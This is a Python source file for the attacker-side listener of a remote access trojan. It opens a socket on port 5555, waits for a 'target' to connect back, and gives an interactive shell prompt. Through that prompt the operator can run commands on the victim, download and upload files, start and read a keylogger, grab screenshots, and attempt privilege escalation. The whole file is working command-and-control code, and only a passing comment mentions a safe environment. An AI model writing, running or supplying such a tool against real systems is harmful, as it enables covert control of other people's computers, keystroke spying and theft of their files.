# Import necessary libraries
import socket # This library is used for creating socket connections.
import json # JSON is used for encoding and decoding data in a structured format.
import os # This library allows interaction with the operating system.


# Function to send data reliably as JSON-encoded strings
def reliable_send(data):
    # Convert the input data into a JSON-encoded string.
    jsondata = json.dumps(data)
    # Send the JSON-encoded data over the network connection after encoding it as bytes.
    target.send(jsondata.encode())


# Function to receive data reliably as JSON-decoded strings
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
            # and remove any trailing whitespace characters.
            data = data + target.recv(1024).decode().rstrip()
            # Parse the received data as a JSON-decoded object.
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    with open(file_name, 'rb') as f:
    # Read the contents of the file and send them over the network connection to the target.
        target.send(f.read())

# Function to download a file from the target machine
def download_file(file_name):
    # Open the specified file in binary write ('wb') mode.
    with open(file_name, 'wb') as f:
        # Set a timeout for receiving data from the target (1 second).
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
            # Write the received data (chunk) to the local file.
            f.write(chunk)
            try:
                # Attempt to receive another chunk of data from the target.
                chunk = target.recv(1024)
            except socket.timeout:
                break
        # Reset the timeout to its default value (None).
        target.settimeout(None)
        # Close the local file after downloading is complete.
        f.close()

# Function for the main communication loop with the target
def target_communication():
    while True:
        try:
            # Prompt the user for a command to send to the target.
            command = input('* Shell~%s: ' % str(ip))
            # Send the user's command to the target using the reliable_send function.
            reliable_send(command)

            if command == 'quit':
                # If the user enters 'quit', exit the loop and close the connection.
                print("Disconnect")
                break
            elif command == 'clear':
                # If the user enters 'clear', clear the terminal screen.
                os.system('clear')
            elif command.startswith('cd '):
                # If the user enters 'cd', change the current directory on the target (not implemented).
                pass  # 'cd' command will be handled by the client, just a placeholder here
            elif command.startswith('download '):
                # If the user enters 'download', initiate the download of a file from the target.
                download_file(command[9:])
            elif command.startswith('upload '):
                # If the user enters 'upload', initiate the upload of a file to the target.
                upload_file(command[7:])
            elif command == 'start_keylogger':
                print("[+] Starting Keylogger...")
            elif command == 'stop_keylogger':
                print("[+] Stopping Keylogger...")
                log = reliable_recv()
                print(log)
            elif command == 'get_keylog':
                log = reliable_recv()
                print("[+] Keylog received: \n" + log)
            elif command.startswith('screenshot ') or command == 'capture_multi' or command.startswith('screenshot_periodic '):
                result = reliable_recv()  # Awaiting screenshot confirmation or data
                print(result)
            elif command.startswith('elevate_privilege'):
                # Attempt to elevate privileges
                print("[+] Attempting to elevate privileges...")
                result = reliable_recv()  # Awaiting confirmation of privilege escalation
                print(result)
            elif command.startswith('sudo '):
                # Special case for sudo commands, may require confirmation or additional data
                result = reliable_recv()
                print(result)
            else:
                # For other commands, receive and print the result from the target.
                result = reliable_recv()
                print(result)
        except Exception as e:
            print(f"Error handling command '{command}': {e}")
            continue

# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific IP address Ex. ('192.168.1.12') and port (5555).
# For setting safe environment use our computer as base IP address (0.0.0.0) and port (5555) 
sock.bind(('0.0.0.0', 5555))

# Start listening for incoming connections (maximum 5 concurrent connections).
print('[+] Listening For The Incoming Connections')
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address.
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Start the main communication loop with the target by calling target_communication.
target_communication()